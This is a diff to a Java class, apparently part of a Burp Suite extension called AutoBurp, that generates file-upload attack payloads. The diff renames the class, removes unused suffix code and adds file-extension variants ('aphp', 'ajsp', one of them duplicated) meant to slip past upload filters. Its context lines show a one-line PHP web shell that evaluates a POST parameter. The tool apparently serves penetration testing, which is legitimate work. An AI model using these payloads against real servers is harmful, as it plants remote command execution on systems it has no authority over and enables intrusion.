@@ -1,3 +1,5 @@
+package AutoBurp.generator;
+
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
@@ -7,7 +9,7 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.Base64;
 
-public class PayloadGenerator {
+public class UploadPayloadGenerator {
 
     public static List<String> getAttackPayloads(String template) {
         
@@ -65,14 +67,6 @@ public class PayloadGenerator {
 
         String originalFilename = filenameMatcher.group(1);
         String originalContent = contentPartMatcher.group(1);
-
-        
-        String filenameSuffix = "";
-        if (originalFilename.contains(".")) {
-            filenameSuffix = originalFilename.substring(originalFilename.lastIndexOf('.') + 1);
-
-        }
-
         
         List<String> phpContents = Arrays.asList(
                 "<?php eval($_POST[\"cmd\"]); ?>",
@@ -190,6 +184,9 @@ public class PayloadGenerator {
             suffixPayload.add(temp);
         }
 
+        suffixPayload.add("aphp");
+        suffixPayload.add("ajsp");
+        suffixPayload.add("aphp");
         return suffixPayload;
     }
 
